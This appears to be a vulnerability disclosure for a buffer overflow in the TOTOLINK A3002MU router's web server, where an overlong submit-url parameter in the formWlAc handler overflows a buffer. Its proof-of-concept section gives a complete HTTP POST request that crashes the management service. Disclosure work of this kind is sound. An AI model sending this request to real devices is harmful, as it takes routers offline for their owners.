# TARGET

**Product:** TOTOlink A3002MU
 **Model:** A3002MU AC1200 Giga Wireless Router
 **Vendor:** TOTOLINK
 **Official Website:** https://www.totolink.net/
 **Firmware Version:** Hh-B20211125.1046

# BUG TYPE

**Buffer Overflow Vulnerability**

# Abstract

A buffer overflow vulnerability exists in the TOTOlink A3002MU router. The vulnerability is located in the `/bin/boa` web server's `formWlAc` interface and is related to the handling of the `submit-url` parameter. Because the firmware does not properly validate the length of this user-controllable input, a remote attacker can send a crafted HTTP request containing an overlong value. 

# Details

The `formWlAc` function was analyzed using IDA Pro. The `submit-url` parameter is read from the HTTP request and later copied into a fixed-size buffer with unsafe string-copy logic. Since the copy path does not enforce a reliable length boundary, an overlong value can overwrite adjacent memory and crash the Boa process.

![analysis screenshot 1](bof-formWlAc.assets/image7.png)

![analysis screenshot 2](bof-formWlAc.assets/image8.png)

# POC

The affected endpoint is `POST /boafrm/formWlAc HTTP/1.1`.

The crafted request or malicious URL used during verification is shown below:

```http
POST /boafrm/formWlAc HTTP/1.1
Host: 192.168.0.1
sessionCheck=97753f44322e8b290a5636ce8c6a162f&submit-url=baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&addFilterMac=1&wlanAcEnabled=1&mac=AABBCCDDEEFF&comment=test

```

Before the attack, the router management interface is accessible and operating normally.

The malicious request or URL is sent to the target device during verification.

After the crafted request is sent and the management page is refreshed, the router web service stops responding, confirming a denial-of-service condition.



![poc screenshot 2](bof-formWlAc.assets/image2.png)

![poc screenshot 3](bof-formWlAc.assets/image3.png)

![poc screenshot 4](bof-formWlAc.assets/image4.png)

![poc screenshot 5](bof-formWlAc.assets/image5.png)
